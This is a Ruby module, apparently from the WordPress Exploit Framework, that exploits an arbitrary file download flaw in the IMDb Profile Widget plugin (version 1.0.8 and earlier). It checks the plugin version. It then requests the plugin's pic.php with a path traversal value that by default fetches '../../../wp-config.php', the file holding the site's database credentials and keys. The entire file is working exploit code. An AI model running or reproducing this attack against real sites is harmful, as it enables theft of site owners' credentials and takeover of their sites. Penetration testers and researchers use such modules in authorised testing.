# frozen_string_literal: true

class Wpxf::Auxiliary::ImdbProfileWidgetArbitraryFileDownload < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'IMDb Profile Widget <= 1.0.8 Arbitrary File Download',
      author: [
        'CrashBandicot @DosPerl', # Disclosure
        'rastating'               # WPXF module
      ],
      references: [
        ['WPVDB', '8426'],
        ['URL', 'https://packetstormsecurity.com/files/136447/']
      ],
      date: 'Mar 26 2016'
    )
  end

  def check
    check_plugin_version_from_readme('imdb-widget', '1.0.9')
  end

  def working_directory
    'wp-content/plugins/imdb-widget/'
  end

  def default_remote_file_path
    '../../../wp-config.php'
  end

  def downloader_url
    normalize_uri(wordpress_url_wp_content, 'plugins', 'imdb-widget', 'pic.php')
  end

  def download_request_params
    { 'url' => remote_file }
  end
end
